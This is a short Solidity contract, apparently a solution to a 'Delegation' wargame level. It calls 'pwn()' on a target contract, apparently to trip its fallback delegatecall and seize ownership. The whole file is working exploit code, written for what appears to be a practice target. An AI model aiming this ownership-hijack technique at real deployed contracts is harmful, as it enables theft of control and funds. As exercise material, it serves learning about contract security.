// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "./Delegation.sol";

contract HackDelegation {

  Delegation public delegation;
  address public owner;

  constructor(address _address) public {
    owner = msg.sender;
    delegation = Delegation(_address);
    console.log("CP1.1: %s", owner);
  }

  function hackDelegation() public payable {
    console.log("CP Hack delegation");
    address(delegation).call(abi.encodeWithSignature("pwn()"));
  }
}
